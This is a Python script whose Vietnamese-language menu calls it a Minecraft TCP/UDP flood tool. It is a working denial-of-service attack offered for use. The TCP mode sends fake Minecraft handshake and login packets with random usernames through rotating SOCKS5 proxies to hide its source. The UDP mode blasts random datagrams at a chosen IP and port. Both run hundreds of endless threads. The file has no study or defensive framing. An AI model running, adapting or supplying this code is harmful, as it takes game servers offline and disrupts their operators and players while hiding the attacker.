import socket, threading, struct, random, string, socks

def encode_varint(value):
    buf = bytearray()
    while True:
        temp = value & 0x7F
        value >>= 7
        if value:
            temp |= 0x80
        buf.append(temp)
        if not value:
            break
    return buf

def build_minecraft_packet(host, port, username):
    packet = bytearray()
    packet += encode_varint(754)
    packet += encode_varint(len(host)) + host.encode()
    packet += struct.pack(">H", port)
    packet += encode_varint(2)
    handshake = encode_varint(len(packet)+1) + b'\x00' + packet

    login = bytearray()
    login += encode_varint(len(username)) + username.encode()
    login_packet = encode_varint(len(login)+1) + b'\x00' + login

    return handshake + login_packet

def tcp_flood(ip, port, host, threads, proxies):
    def run():
        while True:
            try:
                proxy = random.choice(proxies)
                proxy_ip, proxy_port = proxy.split(":")
                proxy_port = int(proxy_port)

                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                s.settimeout(5)
                s.connect((ip, port))

                username = ''.join(random.choices(string.ascii_letters, k=8))
                packet = build_minecraft_packet(host, port, username)
                s.send(packet)
                s.close()
                print(f"[✓] TCP Packet sent via {proxy_ip}:{proxy_port}")
            except Exception as e:
                print(f"[x] Proxy fail: {proxy} - {str(e)}")
    for _ in range(threads):
        threading.Thread(target=run).start()

def udp_flood(ip, port, threads):
    def run():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1024)
                s.sendto(data, (ip, port))
                print(f"[✓] UDP Packet sent to {ip}:{port}")
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=run).start()

def load_proxies(filename="proxies.txt"):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print("❌ Không tìm thấy file proxies.txt")
        return []

def main():
    print("=== Minecraft TCP/UDP Flood Tool (with Proxy) ===")
    print("1. TCP Flood (Fake Minecraft Login + Proxy)")
    print("2. UDP Flood (No proxy)")
    method = input("🔰 Chọn kiểu tấn công (1 hoặc 2): ").strip()

    ip = input("💥 Nhập IP server: ").strip()
    port = int(input("💥 Nhập PORT server: ").strip())
    threads = int(input("🧵 Nhập số luồng tấn công (ví dụ: 500): ").strip())

    if method == "1":
        host = input("🌐 Nhập Hostname server (nếu không biết, gõ localhost): ").strip()
        if not host:
            host = "localhost"
        proxies = load_proxies()
        if not proxies:
            print("❌ Không có proxy hợp lệ. Tạo file proxies.txt trước.")
            return
        print(f"\n🚀 TCP Flood {ip}:{port} với {threads} luồng qua proxy...\n")
        tcp_flood(ip, port, host, threads, proxies)

    elif method == "2":
        print(f"\n🚀 UDP Flood {ip}:{port} với {threads} luồng (không proxy)...\n")
        udp_flood(ip, port, threads)

    else:
        print("❌ Lựa chọn không hợp lệ.")

if __name__ == "__main__":
    main()